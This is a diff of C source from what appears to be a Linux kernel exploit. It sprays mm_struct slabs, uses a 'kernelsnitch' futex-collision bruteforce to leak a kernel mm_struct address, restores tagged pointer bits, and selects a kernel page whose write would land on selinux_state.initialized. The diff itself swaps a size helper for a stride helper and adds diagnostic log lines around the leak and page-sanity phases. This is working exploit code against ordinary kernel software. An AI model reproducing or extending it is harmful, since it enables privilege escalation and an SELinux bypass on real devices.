@@ -62,7 +62,7 @@ int tcp_route_selected(void) {
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
+      mm_struct_stride(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -477,7 +477,7 @@ uintptr_t prepare_kernel_page(void) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
   close_reclaim_sockets();
-  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
+  mm_objs_per_slab = MM_SLAB_SZ / mm_struct_stride();
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
@@ -495,7 +495,7 @@ uintptr_t prepare_kernel_page(void) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      mm_struct_sz(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
+      mm_struct_stride(), MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
@@ -581,9 +581,14 @@ uintptr_t prepare_kernel_page(void) {
 
   pr_info("[spray] futex collisions found +%lldms\n",
           ms_since(&t_spray));
+  /* diagnostic only: explicit leak-phase boundaries */
+  pr_info("[diag] mm_leak start\n");
+  fflush(stdout);
   kernelsnitch_bruteforce(ks);
   pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
           (size_t)ks->mm_struct, ms_since(&t_spray));
+  pr_info("[diag] mm_leak end leaked=0x%zx\n", (size_t)ks->mm_struct);
+  fflush(stdout);
   uintptr_t leaked = ks->mm_struct;
   /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
   leaked |= (uintptr_t)0xf << 56;
@@ -690,15 +695,22 @@ uintptr_t prepare_good_kernel_page(void) {
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page();
     if (base) {
+      /* diagnostic only: explicit page-sanity boundaries */
+      pr_info("[diag] page_sanity start base=0x%zx\n", (size_t)base);
+      fflush(stdout);
       /* W1 stores this page address, so the word's byte 2 lands on
        * selinux_state.initialized. an even byte there fails every SID lookup */
       if (pselect_custom_write == 1 && pselect_child_node &&
           ((fake_right >> 16) & 1) == 0) {
         pr_warning("page %016zx stores an even byte over "
                    "selinux_state.initialized; taking another\n", (size_t)base);
+        pr_info("[diag] page_sanity result=FAIL base=0x%zx\n", (size_t)base);
+        fflush(stdout);
       } else {
         pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
                 ms_since(&t_good));
+        pr_info("[diag] page_sanity result=PASS base=0x%zx\n", (size_t)base);
+        fflush(stdout);
         return base;
       }
     }
@@ -711,5 +723,8 @@ uintptr_t prepare_good_kernel_page(void) {
     pr_warning("prepare_kernel_page retry %d/%d +%lldms\n", attempt,
                max_attempts, ms_since(&t_good));
   }
+  /* diagnostic only: explicit marker for the exhausted retry loop */
+  pr_warning("[diag] page_retries exhausted\n");
+  fflush(stdout);
   return 0;
 }
